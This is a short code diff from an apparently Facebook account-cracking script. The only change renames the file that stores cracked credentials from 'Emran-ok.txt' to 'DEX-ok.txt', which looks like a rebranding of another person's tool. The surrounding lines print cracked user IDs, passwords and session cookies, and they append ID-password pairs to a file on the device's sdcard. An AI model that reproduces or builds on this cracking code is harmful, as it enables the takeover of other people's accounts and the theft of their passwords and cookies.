@@ -73,7 +73,7 @@ def sykology():
         DEX("clear")
         print(logo)
         tl=str(len(emran))
-        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mEmran-ok.txt") 
+        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mDEX-ok.txt") 
         print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
         line()
         for id in emran:
@@ -134,7 +134,7 @@ def random_subb(uid,pwx,fb,fb1):
                 coki1=coki.split("1000")[1]
                 xd="1000"+coki1[0:11]
                 print(f"\r\r\033[38;5;46m[DEX-CYBER-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
-                open("/sdcard/Emran-ok.txt","a").write(xd+"|"+ps+"\n")
+                open("/sdcard/DEX-ok.txt","a").write(xd+"|"+ps+"\n")
                 oks.append(uid)
                 break
             else:
